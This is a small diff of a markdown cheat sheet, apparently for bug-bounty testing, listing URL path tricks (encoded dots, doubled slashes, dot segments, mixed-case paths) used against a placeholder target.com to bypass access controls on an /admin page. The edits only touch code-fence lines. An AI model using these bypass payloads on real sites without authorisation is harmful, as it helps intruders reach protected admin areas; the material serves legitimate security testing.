@@ -15,7 +15,7 @@ http://target.com/%2e/admin => 200
 ```
 
 3. Try add dot (.) and slash (/) in the URL
-```
+``` 
 http://target.com/admin/. => 200
 http://target.com//admin// => 200
 http://target.com/./admin/./ => 200
@@ -29,7 +29,7 @@ http://target.com/./admin/./ => 200
 5. Try to uppercase the alphabet in the url
 ```
 http://target.com/aDmIN
-```
+``` 
 
 Source: [@iam_j0ker](https://twitter.com/iam_j0ker)
 
